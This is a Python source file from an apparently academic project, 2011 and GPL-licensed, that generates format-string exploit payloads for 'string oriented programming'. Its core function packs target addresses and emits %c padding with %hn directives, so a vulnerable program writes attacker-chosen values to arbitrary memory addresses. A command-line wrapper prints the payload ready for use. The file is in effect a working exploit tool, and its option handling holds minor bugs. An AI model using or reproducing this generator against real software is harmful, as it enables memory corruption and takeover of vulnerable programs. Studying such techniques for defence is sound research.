#!/usr/bin/python3
import sys, getopt

# @file sop.py
# This module defines some generic default actions that are used to translate
# specific machine codes.
#
# Copyright (c) 2011 ETH Zurich
# @author Mathias Payer <mathias.payer@nebelwelt.net>
#
# $Date: 2011-12-30 14:06:52 +0100 (Fri, 30 Dec 2011) $
# $LastChangedDate: 2011-12-30 14:06:52 +0100 (Fri, 30 Dec 2011) $
# $LastChangedBy: payerm $
# $Revison: 1104 $
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA  02110-1301, USA.

DESC ="""Format string generator and exploiter for string oriented programming

The generator supports multiple modes:
  Generating a string that writes some random memory location:
    -r raw -w address -v value -s stack_offset

Options:
  -w address: address that is written.
  -v value: value that is written to address.
     (tuples of w/v can be repeated)
  -s stack_offset: the format string's stack offset on the stack (in words)
  -r raw word printed before string
"""

# Generate a format string that writes a specific pointer
# target: target location to write pointer to
# pointer: pointer that is written
# offset: offset (in 4b words) on the stack where the parameter string is located
# roff: relative offset, e.g., from previous writes
def write_formatstring(writes, offset, roff=0):
    formatstring = bytearray()
    valuestring = bytearray()
    # the current running number of printed characters is roff (from previous writes to this string) plus
    # the number of written pointers (we write out two half word pointers per word of 4 bytes)
    cval = roff + len(writes)*2*4
    counter = 0
    for write in writes:
        address, value = write # split write tuple into address and value
        # add both half word addresses to the beginning of the format string
        formatstring.extend([address & 0xff, (address>>8) & 0xff, (address>>16) & 0xff, (address>>24) & 0xff])
        address += 2
        formatstring.extend([address & 0xff, (address>>8) & 0xff, (address>>16) & 0xff, (address>>24) & 0xff])
        # split value into two half words
        uppervalue = (value>>16) & 0xffff
        lowervalue = value & 0xffff
        # write first half word (upper "high" part)
        if (uppervalue > cval):
            valuestring.extend(("%1$" + str(uppervalue - cval) + "c").encode('latin-1'))
        else:
            valuestring.extend(("%1$" + str((uppervalue + (0xffff - cval + 1)) & 0xffff) + "c").encode('latin-1'))
        cval = uppervalue
        valuestring.extend(("%" + str(offset+counter+1) + "$hn").encode('latin-1'))
        # write second half word (lower part)
        if (lowervalue > cval):
            valuestring.extend(("%1$" + str(lowervalue - cval) + "c").encode('latin-1'))
        else:
            valuestring.extend(("%1$" + str((lowervalue + (0xffff - cval + 1)) & 0xffff) + "c").encode('latin-1'))
        cval = lowervalue
        valuestring.extend(("%" + str(offset+counter) + "$hn").encode('latin-1'))
        # prepare for the next written word
        counter += 2
#    for i in range(0, offset):
#        formatstring += "%p"
#        cval += 2
    return formatstring + valuestring
    
if __name__ == "__main__":
    try:
        optlist, args = getopt.getopt(sys.argv[1:], "hw:v:s:r:", ["help", "write" "value" "stack", "raw"])
    except err:
        print(str(err))
        print(DESC)
        sys.exit(2)
    address = -1
    value = -1
    stack = -1
    writtenvalues = ()
    roff = 0
    for o, a in optlist:
        if o in ("-h", "--help"):
            print(DESC)
            sys.exit()
        if o in ("-w", "--write"):
            address = a
        if o in ("-v", "--value"):
            value = a
        if o in ("-s", "--stack"):
            stack = a
        if o in ("-r", "--raw"):
            raw = int(a,0)
            raws = chr(raw & 0xff) + chr((raw>>8) & 0xff) + chr((raw>>16) & 0xff) + chr((raw>>24) & 0xff)
            sys.stdout.write(raws)
            roff += 4
        if (address != -1 and value != -1 and stack != -1):
            writtenvalues += ( ((int(address, 0), int(value, 0))), )
            address = -1
            value = -1
    if (writtenvalues != ()):
        sys.stdout.buffer.write(write_formatstring( writtenvalues, int(stack, 0), roff))
    else:
        print(DESC)
        sys.exit(2)
    #write_formatstring( ((0x30313233, 0x34353637),(0x38393a3b, 0x3c3d3e3f),), 10, 0)
    #print write_formatstring( ((0xffffd36c, 0x080484e2),), 4, 0)
